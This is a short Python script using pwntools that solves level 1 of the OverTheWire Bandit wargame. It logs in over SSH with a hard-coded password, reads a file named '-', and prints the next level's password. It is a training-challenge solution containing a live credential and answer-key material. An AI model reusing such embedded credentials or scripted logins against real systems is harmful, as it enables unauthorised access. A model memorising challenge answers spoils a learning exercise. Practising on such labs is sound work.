#!/usr/bin/env python
from pwn import *

log.info('overthewire.org - bandit1 exploit by SKane')

shell = ssh('bandit1', 'bandit.labs.overthewire.org', password='boJ9jbbUNNfktd78OOpsqOltutMc3MY1', port=2220)

sh =shell.run('sh')

sh.sendline('cat ./-')

log.success("Password for bandit2: " + sh.recvline())
